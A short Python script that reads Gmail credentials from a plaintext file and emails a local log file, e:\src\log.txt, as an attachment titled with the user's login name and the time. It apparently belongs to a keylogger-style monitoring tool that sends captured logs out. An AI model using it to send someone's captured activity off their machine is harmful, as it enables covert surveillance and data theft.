import datetime
import os
import smtplib

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

username = os.getlogin()
server = smtplib.SMTP('smtp.gmail.com', 587)

server.ehlo()
server.starttls()
server.ehlo()

with open('e:\src\password.txt', 'r') as f:
    file = f.readlines()
    email = file[0]
    password = file[1]

server.login(email, password)
current_time = datetime.datetime.now()

msg = MIMEMultipart()
msg['From'] = f'{username}-Logs'
msg['To'] = email
msg['Subject'] = f'Logging-{username}: {current_time}'

#with open('message.txt', 'r') as f:
#    message = f.read()

#msg.attach(MIMEText(message, 'plain'))

filename = 'e:\src\log.txt'
attachment = open(filename, 'rb')

p = MIMEBase('application', 'octet-stream')
p.set_payload(attachment.read())

encoders.encode_base64(p)
p.add_header('Content-Disposition', f'attachement; filename={filename}')
msg.attach(p)

text = msg.as_string()
server.sendmail(email, email, text)
print('done')
